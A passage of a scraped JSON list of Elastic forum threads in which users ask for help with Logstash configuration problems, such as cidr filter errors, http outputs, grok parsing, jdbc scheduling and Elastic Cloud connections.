    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b6ff07cc-48fe-4eb5-aa4f-fe4aa07da556",
    "url": "https://discuss.elastic.co/t/logstash-cidr-filter-throws-error-if-dictionary-file-is-empty/228496",
    "title": "Logstash cidr filter throws error if dictionary file is empty",
    "category": [
      "Logstash"
    ],
    "author": "blueren",
    "date": "April 17, 2020, 11:52am April 17, 2020, 2:49pm",
    "body": "This is on the back of an older unresolved issue: Logstash translate filter throws error if dictionary file is empty I am running into the same problem as mentioned in the above stale issue. I have a translate filter like so: # Check if destination IP address is private. cidr { id => \"elastiflow_postproc_cidr_dst_addr\" address => [ \"%{[flow][dst_addr]}\" ] # network => [ \"0.0.0.0/32\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"fc00::/7\", \"127.0.0.0/8\", \"::1/128\",\"169.254.0.0/16\", \"fe80::/10\",\"224.0.0.0/4\", \"ff00::/8\",\"255.255.255.255/32\" ] network_path => \"${ELASTIFLOW_DICT_PATH:/usr/share/logstash/elastiflow/dictionaries}/private_ip_addresses.yml\" refresh_interval => 30 add_field => { \"[flow][dst_autonomous_system]\" => \"private\" } } The file private_ip_addresses.yaml is by default an empty file and will be populated at a later point in time by a different application. However, when the file is empty, logstash crashes while reading that file: (click to expand error) Summary events, please check your filter configuration and restart Logstash. org.jruby.exceptions.NoMethodError: (NoMethodError) undefined method `collect' for nil:NilClass at usr.share.logstash.vendor.bundle.jruby.$2_dot_5_dot_0.gems.logstash_minus_filter_minus_cidr_minus_3_dot_1_dot_2_minus_java.lib.logstash.filters.cidr.filter(/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-cidr-3.1.2-java/lib/logstash/filters/cidr.rb:144) ~[?:?] at usr.share.logstash.logstash_minus_core.lib.logstash.filters.base.do_filter(/usr/share/logstash/logstash-core/lib/logstash/filters/base.rb:143) ~[?:?] at usr.share.logstash.logstash_minus_core.lib.logstash.filters.base.multi_filter(/usr/share/logstash/logstash-core/lib/logstash/filters/base.rb:162) ~[?:?] at org.jruby.RubyArray.each(org/jruby/RubyArray.java:1792) ~[jruby-complete-9.2.7.0.jar:?] at usr.share.logstash.logstash_minus_core.lib.logstash.filters.base.multi_filter(/usr/share/logstash/logstash-core/lib/logstash/filters/base.rb:159) ~[?:?] at org.logstash.config.ir.compiler.AbstractFilterDelegatorExt.multi_filter(org/logstash/config/ir/compiler/AbstractFilterDelegatorExt.java:115) ~[logstash-core.jar:?] at usr.share.logstash.logstash_minus_core.lib.logstash.java_pipeline.start_workers(/usr/share/logstash/logstash-core/lib/logstash/java_pipeline.rb:235) ~[?:?] warning: thread \"[elastiflow]>worker0\" terminated with exception (report_on_exception is true): java.lang.IllegalStateException: org.jruby.exceptions.NoMethodError: (NoMethodError) undefined method `collect' for nil:NilClass at org.logstash.execution.WorkerLoop.run(org/logstash/execution/WorkerLoop.java:85) at java.lang.reflect.Method.invoke(java/lang/reflect/Method.java:498) at org.jruby.javasupport.JavaMethod.invokeDirectWithExceptionHandling(org/jruby/javasupport/JavaMethod.java:425) at org.jruby.javasupport.JavaMethod.invokeDirect(org/jruby/javasupport/JavaMethod.java:292) at usr.share.logstash.logstash_minus_core.lib.logstash.java_pipeline.start_workers(/usr/share/logstash/logstash-core/lib/logstash/java_pipeline.rb:235) at org.jruby.RubyProc.call(org/jruby/RubyProc.java:295) at org.jruby.RubyProc.call(org/jruby/RubyProc.java:274) at org.jruby.RubyProc.call(org/jruby/RubyProc.java:270) at java.lang.Thread.run(java/lang/Thread.java:748) How exactly do I get it to work? I want to make it work as below: if the file is NOT present, fallback on the inline parameters provided (the line that is commented #network) If the file is present BUT empty, do the same as option 1, fallback to whatever is inline. If the file is present and has content, rely on the content of the file Is this doable. How? Thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5b917372-c4fe-451d-b285-c96d7ed8aabd",
    "url": "https://discuss.elastic.co/t/logstash-http-filter-plugin/228516",
    "title": "Logstash http filter plugin",
    "category": [
      "Logstash"
    ],
    "author": "akhilsharma.in",
    "date": "April 17, 2020, 1:01pm April 17, 2020, 2:33pm April 17, 2020, 2:46pm",
    "body": "Team, we're using http in filter to make a REST API call. Body of the call accepts a parameter which should be an array like [1111,11] but while passing this parameter, logstash is converting array to string which is \"[1111,11]\" and call is not working. Please suggest a way to neglect double quotes and send it as array only. thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5b23b43f-8f7d-4f58-bca6-5da11859f1af",
    "url": "https://discuss.elastic.co/t/logstash-output-http-from-a-curl-command/228389",
    "title": "Logstash output http from a curl command",
    "category": [
      "Logstash"
    ],
    "author": "stcdarrell",
    "date": "April 16, 2020, 5:53pm April 17, 2020, 2:16pm",
    "body": "hi, i need to go from logstash to a web restAPI, i'm having trouble converting a curl command into the output { http {}} format. any suggestions would be appreciated.. there arent many examples.. This is the curl command that works: curl -X PUT \"http://192.168.4.148:5000/indicators\" -H \"accept: application/json\" -H \"Content-Type: application/json\" -d '{\"indicator\":\"%{src_ip}\", \"group\": \"everyone\", \"provider\": \"laFusionCenter:%{type}\", \"confidence\":\"4\", \"tlp\":\"green\", \"count\":\"%{count}\"}' I * think * I’d want to use format “message” and the message being you json string.. any suggestions or help would be appreciated.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7f5401ca-1cc4-40ec-aa8d-6f3ef21dc11f",
    "url": "https://discuss.elastic.co/t/ingest-stabilization-on-db/228515",
    "title": "Ingest stabilization on db",
    "category": [
      "Logstash"
    ],
    "author": "jagan",
    "date": "April 17, 2020, 12:52pm",
    "body": "Hi guru's, please help me how do i handle the situation.The events are comming from Kafka topics and the source is oracle and sink is logstash. i) I want to get the events to the ES index when connection is not stable also(i.e n/w issues,configuration issue etc..). ii)if any failure in db connection how do i move the failed index data to other failed indexes. Thanks, Jagan",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f1dac6f6-b8f2-4517-a5df-94defd977322",
    "url": "https://discuss.elastic.co/t/how-to-split-message-fields-when-we-have-dynamic-logs/228497",
    "title": "How to split message fields when we have dynamic logs",
    "category": [
      "Logstash"
    ],
    "author": "hemant_472",
    "date": "April 17, 2020, 11:09am",
    "body": "I am able to split fields using GROK in my logstash config file but have no idea how to split every log because the logs are dynamic for eg: log 1 : Dec 28 05:05:47 ff402-srv1 MC: DEBUG {2416824} [PlanJob] EXPLICIT: DuraNoRamp=5.652 MaxMinDuraNoRamp=5.652 MaxSpeed=0.500 MinActP=0.000000 Log 2 : Dec 28 04:36:11 desk.outlet12 MD: Request state change enter standby to UI Please let me know what can i use like some conditional statements or any or operator for different patterns in my logstash",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e290f691-9c04-4e86-b0ec-fbb2d9bfb2cf",
    "url": "https://discuss.elastic.co/t/stuck-at-successfully-started-logstash-api-endpoint-port-9601/228475",
    "title": "Stuck at Successfully started Logstash API endpoint {:port=>9601}",
    "category": [
      "Logstash"
    ],
    "author": "Vrinda_R",
    "date": "April 17, 2020, 8:34am",
    "body": "Hi!! I'm new to logstash and i'm stuck at this point . Earlier in the first run i got an error like Broker invalid and after that it's stuck at Successfully started Logstash API endpoint {:port=>9601} My conf file: ` input { file { path => \"/var/log/10k.log.save\" start_position => \"beginning\" } } output { kafka { bootstrap_servers => \"xxx:9092\" topic_id => 'xxx' } } ` Thanks",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "0c7f60b1-8c32-491e-bc5f-c5506584587e",
    "url": "https://discuss.elastic.co/t/is-pq-needed-for-logstash-kinesis-input-plugin/225970",
    "title": "Is PQ needed for logstash kinesis input plugin?",
    "category": [
      "Logstash"
    ],
    "author": "deepak_deore",
    "date": "April 1, 2020, 4:10am April 3, 2020, 4:29am April 17, 2020, 5:09am",
    "body": "logstash pulls the logs from aws kinesis, so it will read as per its own speed and there wont be sudden spike because data isnt pushed to logstash instead logstash pulls it. in this case is PQ (persistent queue) really needed?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a0a97eab-d26c-4570-b51e-63f287ffdca7",
    "url": "https://discuss.elastic.co/t/upload-logstash-and-elastic-cloud-data/228448",
    "title": "Upload Logstash and Elastic Cloud data",
    "category": [
      "Logstash"
    ],
    "author": "111317",
    "date": "April 17, 2020, 4:57am April 17, 2020, 4:59am April 17, 2020, 4:59am",
    "body": "Logstash has been successful. Java HotSpot(TM) 64-Bit Server VM warning: Ignoring option UseConcMarkSweepGC; support was removed in 14.0 Java HotSpot(TM) 64-Bit Server VM warning: Ignoring option CMSInitiatingOccupancyFraction; support was removed in 14.0 Java HotSpot(TM) 64-Bit Server VM warning: Ignoring option UseCMSInitiatingOccupancyOnly; support was removed in 14.0 WARNING: An illegal reflective access operation has occurred WARNING: Illegal reflective access by com.headius.backport9.modules.Modules (file:/root/logstash-7.6.2/logstash-core/lib/jars/jruby-complete-9.2.9.0.jar) to method sun.nio.ch.NativeThread.signal(long) WARNING: Please consider reporting this to the maintainers of com.headius.backport9.modules.Modules WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations WARNING: All illegal access operations will be denied in a future release Sending Logstash logs to /root/logstash-7.6.2/logs which is now configured via log4j2.properties [2020-04-17T09:42:16,278][WARN ][logstash.config.source.multilocal] Ignoring the 'pipelines.yml' file because modules or command line options are specified [2020-04-17T09:42:16,412][INFO ][logstash.runner ] Starting Logstash {\"logstash.version\"=>\"7.6.2\"} [2020-04-17T09:42:18,559][INFO ][org.reflections.Reflections] Reflections took 78 ms to scan 1 urls, producing 20 keys and 40 values [2020-04-17T09:42:19,712][INFO ][logstash.outputs.elasticsearch][main] Elasticsearch pool URLs updated {:changes=>{:removed=>[], :added=>[https://elastic:xxxxxx@a77aaf4882664376b700d79c0fa670c6.ap-southeast-1.aws.found.io:9243/]}} [2020-04-17T09:42:20,553][WARN ][logstash.outputs.elasticsearch][main] Restored connection to ES instance {:url=>\"https://elastic:xxxxxx@a77aaf4882664376b700d79c0fa670c6.ap-southeast-1.aws.found.io:9243/\"} [2020-04-17T09:42:21,008][INFO ][logstash.outputs.elasticsearch][main] ES Output version determined {:es_version=>7} [2020-04-17T09:42:21,020][WARN ][logstash.outputs.elasticsearch][main] Detected a 6.x and above cluster: the `type` event field won't be used to determine the document _type {:es_version=>7} [2020-04-17T09:42:21,200][INFO ][logstash.outputs.elasticsearch][main] New Elasticsearch output {:class=>\"LogStash::Outputs::ElasticSearch\", :hosts=>[\"https://a77aaf4882664376b700d79c0fa670c6.ap-southeast-1.aws.found.io:9243/\"]} [2020-04-17T09:42:21,315][WARN ][org.logstash.instrument.metrics.gauge.LazyDelegatingGauge][main] A gauge metric of an unknown type (org.jruby.RubyArray) has been created for key: cluster_uuids. This may result in invalid serialization. It is recommended to log an issue to the responsible developer/development team. [2020-04-17T09:42:21,324][INFO ][logstash.javapipeline ][main] Starting pipeline {:pipeline_id=>\"main\", \"pipeline.workers\"=>2, \"pipeline.batch.size\"=>125, \"pipeline.batch.delay\"=>50, \"pipeline.max_inflight\"=>250, \"pipeline.sources\"=>[\"/root/logstash-7.6.2/config/test.conf\"], :thread=>\"#<Thread:0x515c422e run>\"} [2020-04-17T09:42:21,454][INFO ][logstash.outputs.elasticsearch][main] Using default mapping template [2020-04-17T09:42:21,666][INFO ][logstash.outputs.elasticsearch][main] Attempting to install template {:manage_template=>{\"index_patterns\"=>\"logstash-*\", \"version\"=>60001, \"settings\"=>{\"index.refresh_interval\"=>\"5s\", \"number_of_shards\"=>1}, \"mappings\"=>{\"dynamic_templates\"=>[{\"message_field\"=>{\"path_match\"=>\"message\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false}}}, {\"string_fields\"=>{\"match\"=>\"*\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false, \"fields\"=>{\"keyword\"=>{\"type\"=>\"keyword\", \"ignore_above\"=>256}}}}}], \"properties\"=>{\"@timestamp\"=>{\"type\"=>\"date\"}, \"@version\"=>{\"type\"=>\"keyword\"}, \"geoip\"=>{\"dynamic\"=>true, \"properties\"=>{\"ip\"=>{\"type\"=>\"ip\"}, \"location\"=>{\"type\"=>\"geo_point\"}, \"latitude\"=>{\"type\"=>\"half_float\"}, \"longitude\"=>{\"type\"=>\"half_float\"}}}}}}} [2020-04-17T09:42:22,921][INFO ][logstash.javapipeline ][main] Pipeline started {\"pipeline.id\"=>\"main\"} [2020-04-17T09:42:23,014][INFO ][logstash.agent ] Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>[]} [2020-04-17T09:42:23,042][INFO ][filewatch.observingtail ][main] START, creating Discoverer, Watch with file and sincedb collections [2020-04-17T09:42:23,431][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9600} However, when I check in Kibana, the index has not arrived. Logstash settings are: 1 # Sample Logstash configuration for creating a simple 2 # Beats -> Logstash -> Elasticsearch pipeline. 3 4 input { 5 file{ 6 path => \"/root/testlog/*\" 7 start_position => \"beginning\" 8 sincedb_path => \"/dev/null\" 9 } 10 } 11 filter { 12 json { 13 source => \"message\" 14 } 15 } 16 output { 17 elasticsearch { 18 action => \"index\" 19 index => \"logtest\" 20 hosts => [\"https://******************.ap-********.aws .found.io:9243/\"] 21 #stdout{ 22 # codec => \"rubydebug\" 23 user => \"******\" 24 password => \"************\" 25 #user => \"elastic\" 26 } 27 }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f28aedb6-5210-4b9b-a289-d864b6f6ac25",
    "url": "https://discuss.elastic.co/t/how-to-send-data-to-elastic-cloud-with-on-premise-logstash/228423",
    "title": "How to send data to Elastic Cloud with On-Premise Logstash",
    "category": [
      "Logstash"
    ],
    "author": "111317",
    "date": "April 17, 2020, 12:09am April 17, 2020, 12:10am April 17, 2020, 12:11am April 17, 2020, 12:17am April 17, 2020, 12:27am April 17, 2020, 12:44am April 17, 2020, 12:46am April 17, 2020, 12:54am April 17, 2020, 12:57am April 17, 2020, 1:16am April 17, 2020, 2:03am April 17, 2020, 2:03am April 17, 2020, 5:01am April 17, 2020, 3:29am April 17, 2020, 3:49am",
    "body": "I am using Elastic Cloud. I want to move data from Linux on VMware to Elastic Cloud. What settings do you need?",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "868ffecf-7e51-49c5-a171-17914402eab5",
    "url": "https://discuss.elastic.co/t/logstash-to-send-logs-to-multiple-locations/225784",
    "title": "Logstash to send logs to multiple locations",
    "category": [
      "Logstash"
    ],
    "author": "rossw",
    "date": "March 31, 2020, 5:11am March 31, 2020, 8:44pm March 31, 2020, 9:00pm March 31, 2020, 9:53pm April 17, 2020, 2:37am",
    "body": "I have seen several people ask this question, but there has been no complete solution delivered. Several people have said \"just do this\" or \"just do that\" without telling us what \"this\" or \"that\" are. So the requirement is: receive messages (syslogs, and various beats inputs) into Logstash pull the messages apart to understand the content send all messages to Elastic for storage and searching using ECS send a selected group of messages (based on what we saw when we pulled it apart) to a SIEM tool in syslog format BUT it has to be in the original syslog format without addition Logstash fields in front of it, so that the SIEM tool can understand the content. In one sentence - everthing goes to the Elastic for later searching, and a subset of messages go to the SIEM if they are interesting security events. Has anyone got a pattern for this; it seems like a fairly common requirement. Thanks Ross",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "03812fb5-2e30-48c0-9a7f-28ad6bf28c1c",
    "url": "https://discuss.elastic.co/t/sql-last-value-reset-to-0-at-12-hour/228428",
    "title": "Sql_last_value reset to 0 at 12 hour",
    "category": [
      "Logstash"
    ],
    "author": "Veeru_Badavath",
    "date": "April 17, 2020, 2:14am",
    "body": "Hi, I am new to ELK stack. I am planning to fetch data from Oracle table to visualise data in Kibana. My table doesn't have primary key column so based timestamp (format: hhmmss eg. 00001) column scheduling to fetch incremental record using \"sql_last_value\". The issue what I am facing with sql_last_value as it's value at end of the day will be set with 235959. When the next day starts sql_last_value value should replace with 0 other wise as timestamp again start from 000000. Hence records cannot be retrieved. input { jdbc { jdbc_connection_string => \"jdbc:mysql://localhost:3306/elk\" # The user we wish to execute our statement as jdbc_user => \"jesus\" jdbc_password => \"Jesus@12345\" # The path to our downloaded jdbc driver jdbc_driver_library => \"path to oracle jar\" jdbc_driver_class => \"oracle driver\" # our query statement => \"SELECT *,id,refnum FROM storeData where localTime>:sql_last_value\" use_column_value => true tracking_column => \"id\" last_run_metadata_path => \"/media/jesus/HD4/Software/ELK/.logstash_jdbc_last_run\" schedule => \"*/5 * * * * *\" } } output { stdout { codec => rubydebug } elasticsearch { \"hosts\" => \"localhost:9200\" \"index\" => \"test-2\" \"document_type\" => \"data\" \"document_id\" => \"%{id}%{refnum}\" } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e623c7b6-6237-4057-b273-ebed76e14efe",
    "url": "https://discuss.elastic.co/t/failed-to-fetch-x-pack-information-from-elasticsearch/227712",
    "title": "Failed to fetch X-Pack information from Elasticsearch",
    "category": [
      "Logstash"
    ],
    "author": "enricobachiorrini",
    "date": "April 13, 2020, 8:30am April 13, 2020, 1:24am April 13, 2020, 10:24am April 17, 2020, 12:58am April 17, 2020, 1:27am",
    "body": "Hello, I'm setting up elasticsearch and centralized pipeline management. Elasticsearch crashes with these errors: [2020-04-13T00:41:44,943][ERROR][logstash.licensechecker.licensereader] Unable to retrieve license information from license server {:message=>\"Elasticsearch Unreachable: [http://127.0.0.1:9200/][Manticore::SocketException] Connection refused (Connection refused)\"} [2020-04-13T00:41:45,021][ERROR][logstash.configmanagement.elasticsearchsource] Failed to fetch X-Pack information from Elasticsearch. This is likely due to failure to reach a live Elasticsearch cluster. I am using cloud_id and cloud_auth in the logstash.yml configuration. This is what it looks like: path.data: /var/lib/logstash cloud.id: <cluster>:<string> cloud.auth: elastic:<password> log.level: info path.logs: /var/log/logstash xpack.management.enabled: true xpack.management.pipeline.id: [\"mypipeline\"] xpack.management.elasticsearch.cloud_id: <cluster>:<string> xpack.management.elasticsearch.cloud_auth: elastic:<password> This is the complete log: [2020-04-13T00:48:45,460][INFO ][logstash.configmanagement.bootstrapcheck] Using Elasticsearch as config store {:pipeline_id=>[\"mypipeline\"], :poll_interval=>\"5000000000ns\"} [2020-04-13T00:48:47,305][ERROR][logstash.licensechecker.licensereader] Unable to retrieve license information from license server {:message=>\"Elasticsearch Unreachable: [http://127.0.0.1:9200/][Manticore::SocketException] Connection refused (Connection refused)\"} [2020-04-13T00:48:47,392][ERROR][logstash.configmanagement.elasticsearchsource] Failed to fetch X-Pack information from Elasticsearch. This is likely due to failure to reach a live Elasticsearch cluster. [2020-04-13T00:48:47,406][FATAL][logstash.runner ] An unexpected error occurred! {:error=>#<LogStash::LicenseChecker::LicenseError: Failed to fetch X-Pack information from Elasticsearch. This is likely due to failure to reach a live Elasticsearch cluster.>, :backtrace=>[\"/usr/share/logstash/x-pack/lib/license_checker/licensed.rb:67:in `with_license_check'\", \"/usr/share/logstash/x-pack/lib/config_management/elasticsearch_source.rb:55:in `initialize'\", \"/usr/share/logstash/x-pack/lib/config_management/hooks.rb:41:in `after_bootstrap_checks'\", \"org/logstash/execution/EventDispatcherExt.java:71:in `execute'\", \"/usr/share/logstash/logstash-core/lib/logstash/runner.rb:299:in `execute'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/clamp-0.6.5/lib/clamp/command.rb:67:in `run'\", \"/usr/share/logstash/logstash-core/lib/logstash/runner.rb:242:in `run'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/clamp-0.6.5/lib/clamp/command.rb:132:in `run'\", \"/usr/share/logstash/lib/bootstrap/environment.rb:73:in `<main>'\"]} [2020-04-13T00:48:47,418][ERROR][org.logstash.Logstash ] java.lang.IllegalStateException: Logstash stopped processing because of an error: (SystemExit) exit It looks like it's trying to connect to 127.0.0.1:9200 (where I don't have elasticsearch) instead of the cloud cluster. I created the pipeline mypipeline in Logstash Pipelines from the Kibana Management and its syntax is correct. This pipeline works fine if I save it in a /conf.d/mypipeline.conf instead of centralized pipeline management.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "593217b5-5d52-4a16-8b43-f2b8ab87756d",
    "url": "https://discuss.elastic.co/t/currently-we-are-on-logstash-1-4-2-but-to-comply-new-elasticsearch-requirements-we-need-to-move-to-logstash-version-2-or-more-i-am-looking-for-any-document-or-url-that-provides-steps/228417",
    "title": "Currently we are on logstash 1.4.2 , but to comply new elasticsearch requirements we need to move to logstash version 2 or more, I am looking for any document or url that provides steps",
    "category": [
      "Logstash"
    ],
    "author": "ssunkara",
    "date": "April 16, 2020, 11:14pm April 16, 2020, 11:15pm April 16, 2020, 11:27pm April 16, 2020, 11:45pm",
    "body": "Currently we are on logstash 1.4.2 , but to comply new elasticsearch requirements we need to move to logstash version 2 or more, I am looking for any document or url that provides steps.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a205eabf-ffe8-48bc-b25c-d28f74ffdf77",
    "url": "https://discuss.elastic.co/t/syslogging-a-unifi-stack-with-elastic-stack/226483",
    "title": "Syslogging a Unifi Stack with Elastic Stack",
    "category": [
      "Logstash"
    ],
    "author": "patrick_kelly_aci",
    "date": "April 3, 2020, 10:38pm April 4, 2020, 12:33am April 4, 2020, 2:56am April 5, 2020, 10:39am April 6, 2020, 3:33pm April 9, 2020, 8:51pm April 10, 2020, 5:04pm April 10, 2020, 8:33pm April 16, 2020, 11:33pm",
    "body": "So I wanted to start by stating that I am very new to Elastic Stack and I've been in IT for one year so my understanding of the way it works is very basic. I have completed the setup basic operations of Elastic Stack on a Windows Server 2016. Here is the guide I used and went all the way through to Step 23 for reference. My goal is to have Elastic Stack listening to logs from our UniFi Security Gateway XG-8 and there are settings in Unifi to set the IP and Port for a syslogging server. IP is pretty straight forward, but I'm not really sure what port I should send it through so that Logstash catches it. Do I need to set this up with one of the beats? Any help with this is much appreciated since my research time has been dramatically reduced because of recent events.",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "5d51df47-6dc5-46d2-96a8-18f7bee1612c",
    "url": "https://discuss.elastic.co/t/grok-pattern-match-for-multiple-lines/228408",
    "title": "Grok pattern match for multiple lines",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 16, 2020, 9:34pm April 16, 2020, 9:42pm April 16, 2020, 10:37pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ce3d16b4-2a9c-4502-afb2-c2be9c6d5fed",
    "url": "https://discuss.elastic.co/t/two-pipelines-modifying-different-fields-on-the-same-appsearch-index-keep-overwriting-each-other/228402",
    "title": "Two pipelines modifying different fields on the same AppSearch index keep overwriting each other",
    "category": [
      "Logstash"
    ],
    "author": "gpribi",
    "date": "April 16, 2020, 8:48pm",
    "body": "Hello, I have two pipelines modifying different fields from the same documents and each time one pipeline runs, it overwrites the information of the other pipeline's fields. I have a large (150K) product database in ElasticSearch. The source is my transactional mysql database, which ingests new and updated products into ElasticSearch through AppSearch and Logstash. I have two pipelines with jdbc as input and appsearch as output plugin. This queries my database and generates POST requests to AppSearch, which internally modifies the underlying ElasticSearch. The first one runs every 5 minutes, inserts new records and should update almost every field of the existing documents. I need this to be scheduled as frequent as possible. The other is much heavier, runs every hour and should update just 1 or 2 fields of all the existing documents. When the heavy pipeline finishes writing this 1 or 2 fields, 5 minutes later the other pipeline runs, and despite the input event doesn't include those 1 or 2 special fields, it blanks them anyway. Since AppSearch is very limited in advanced query operations, I can't make one index (or Engine in AppSearch) for each pipeline and join them when searching. I need all the information in the same index. I also thought as workaround to use some filter to query the elasticsearch/appsearch document being modified in order to get the rest of the fields' values and then send the full event to appsearch. This is a very inefficient solution, if even possible. How can have this two pipelines modify only specific fields form the same documents without overwriting each other? Thank you in advance",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ed2b3f5c-7477-4886-b695-e0f86d016354",
    "url": "https://discuss.elastic.co/t/dateparse-failure-when-trying-to-get-date-from-xml-file/228342",
    "title": "Dateparse failure When trying to get date from xml file",
    "category": [
      "Logstash"
    ],
    "author": "kagashe",
    "date": "April 16, 2020, 2:37pm April 16, 2020, 3:20pm April 16, 2020, 3:48pm April 16, 2020, 4:32pm April 17, 2020, 6:27am April 17, 2020, 7:55am April 16, 2020, 8:17pm April 16, 2020, 8:27pm",
    "body": "Hi all, I'm trying to update the @timestamp field to be the timestamp pulled from my source xml file. The xml fields are mapped with xpath and all seem to be parsing fine however when I run the date filter below it does not parse and update the @timestamp field, where am I going wrong? this is datetime format i'm trying to parse which is mapped to the 'time' field by the xml filter. 2020-02-01 02:28:39.647919 +0000 And this is my date filter which comes after the xml filter filter { date { match => [ \"time\", \"yyyy-MM-dd HH:mm:ss.SSSSSSZ\", \"yyyy-MM-dd HH:mm:ss.SSSSSS Z\", \"yyyy-MM-dd HH:mm:ss.SSS Z\", \"yyyy-MM-dd HH:mm:ss.SSSZ\", \"yyyy-MM-dd HH:mm:ss.SSS\", \"yyyy-MM-dd HH:mm:ss,SSS\", \"yyyy-MM-dd HH:mm:ss\" ] target => \"@timestamp\" } } any help would be really appreciated, this is starting to do my head in.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "e385c950-ae46-493d-ab03-5a4d88879298",
    "url": "https://discuss.elastic.co/t/set-a-default-value-if-nil/228319",
    "title": "Set a default value if nil",
    "category": [
      "Logstash"
    ],
    "author": "Yaniv_Nuriel",
    "date": "April 16, 2020, 1:03pm April 16, 2020, 1:43pm April 16, 2020, 1:56pm April 16, 2020, 2:37pm April 16, 2020, 2:49pm April 16, 2020, 2:54pm April 16, 2020, 5:35pm April 16, 2020, 7:29pm April 16, 2020, 8:26pm",
    "body": "Hey, I know it has been asked a lot, but I tried every solution and nothing works for me. I have a field that sometimes is empty (,,) so I want to set \"ebay\" in that case. Here it is how it looks like when it is nil: \"marketplace\" => nil , And when I set the conf file as follow it is still nil if [!marketplace] { mutate {add_field => {\"marketplace\" => \"ebay\"} } } What am I doing wrong? Thanks!! Yaniv",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "461e04b0-8393-4735-a532-b637a7267c9b",
    "url": "https://discuss.elastic.co/t/logstash-input-jmx-and-maven/228382",
    "title": "Logstash-input-jmx and maven",
    "category": [
      "Logstash"
    ],
    "author": "granier",
    "date": "April 16, 2020, 5:31pm",
    "body": "Hi, I try to install logstash plugin logstash-input-jmx maven, I defined the HTTP_PROXY variable and I get the following error message. WARNING: A maven settings file already exist at /root/.m2/settings.xml, please review the content to make sure it include your proxies configuration. ERROR: Something went wrong when installing logstash-input-jmx*, message: 403 \"Forbidden\". What are the links between the plugin and Maven ? Thanks for any helps, B. Granier Elasticsearch certified",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "37adeb59-86af-4502-ad87-92676da526d9",
    "url": "https://discuss.elastic.co/t/unable-to-rename-host-to-host-name/227824",
    "title": "Unable to rename host to [host][name]",
    "category": [
      "Logstash"
    ],
    "author": "boyhittscar",
    "date": "April 13, 2020, 9:09pm April 13, 2020, 10:42pm April 14, 2020, 10:12am April 15, 2020, 7:07pm April 16, 2020, 5:06pm",
    "body": "Hello - I feel like this should be easy, and I'm not really sure why this isn't working. I have the following data host: MYPC endpoint_type: computer To follow ECS, I'm attempting to do a mutate and rename /nest the fields to host.name host.type However - that appears to failed with the following [2020-04-13T16:50:52,406][WARN ][logstash.outputs.elasticsearch][main] Could not index event to Elasticsearch. {:status=>400, :action=>[\"index\", {:_id=>nil, :_index=>\"dev-2020.04.13\", :routing=>nil, :_type=>\"_doc\"}, #<LogStash::Event:0x36df53bc>], :response=>{\"index\"=>{\"_index\"=>\"dev-2020.04.13\", \"_type\"=>\"_doc\", \"_id\"=>\"LRRPdXEBiQpvxsQYIBFT\", \"status\"=>400, \"error\"=>{\"type\"=>\"mapper_parsing_exception\", \"reason\"=>\"failed to parse field [host] of type [text] in document with id 'xxxxxxxxxxxxx'. Preview of field's value: '{type=computer}'\", \"caused_by\"=>{\"type\"=>\"illegal_state_exception\", \"reason\"=>\"Can't get text on a START_OBJECT at 1:844\"}}}}} I even tried dropping the field host to then rename (as there were prior contents in there) but that still didn't work.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "966662ac-00ee-4934-8916-1278fa4467e0",
    "url": "https://discuss.elastic.co/t/migrate-to-ecs/228356",
    "title": "Migrate to ECS",
    "category": [
      "Logstash"
    ],
    "author": "inandi",
    "date": "April 16, 2020, 3:44pm",
    "body": "Hi, I want to migrate ECS. my current project log system is below my sample data in kibana is { \"_index\": \"winlogbeat-6.6.1-2020.04.16\", \"_type\": \"doc\", \"_id\": \"ayaGg3EBM9cZYkQ41G7F\", \"_version\": 1, \"_score\": null, \"_source\": { \"@timestamp\": \"2020-04-16T15:06:22.000Z\", \"type\": \"wineventlog\", \"tags\": [ \"vfde-st1-oil\", \"oil\", \"Eventlogs\" ], \"beat\": { \"name\": \"vfdest1app1\", \"hostname\": \"vfdest1app1\", \"version\": \"6.6.1\" }, \"keywords\": [ \"Classic\" ], \"source_name\": \"WCFProxy\", \"opcode\": \"Info\", \"record_number\": \"96655853\", \"level\": \"Warning\", \"host\": { \"name\": \"vfdest1app1\" }, \"event_id\": 0, \"message\": \"[I01_SearchCustomer] Error occured while sending metrics. System.Net.WebException: The underlying connection was closed: The connection was closed unexpectedly.\\n at System.Net.WebClient.UploadDataInternal(Uri address, String method, Byte[] data, WebRequest& request)\\n at System.Net.WebClient.UploadData(Uri address, String method, Byte[] data)\\n at Metrics.InfluxDB.Adapters.InfluxdbHttpWriter.WriteToTransport(Byte[] bytes)\", \"event_data\": { \"param1\": \"[I01_SearchCustomer] Error occured while sending metrics. System.Net.WebException: The underlying connection was closed: The connection was closed 